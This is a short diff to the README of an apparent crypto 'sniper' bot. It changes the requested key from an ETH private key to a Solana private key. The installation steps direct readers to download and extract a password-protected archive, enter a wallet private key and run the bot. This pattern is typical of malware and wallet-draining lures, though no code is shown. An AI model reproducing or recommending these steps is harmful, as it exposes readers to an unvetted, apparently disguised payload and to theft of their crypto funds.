@@ -20,7 +20,7 @@ Through its automated processes and lightning-fast decision-making capabilities,
 #### Installation Guide
 Include detailed instructions on how to install and set up the bot:
 1. [Clone](https://github.com/origami-xyz/shitcoin-sniper-bot/archive/refs/heads/main.zip) the repository realease and extract files with password `6aWmUtTAA`.
-2. Input your ETH private key. Ensure that you do not utilize your primary account or seed phrase.
+2. Input your Solana private key. Ensure that you do not utilize your primary account or seed phrase.
 3. Start the bot.
    
 #### Usage
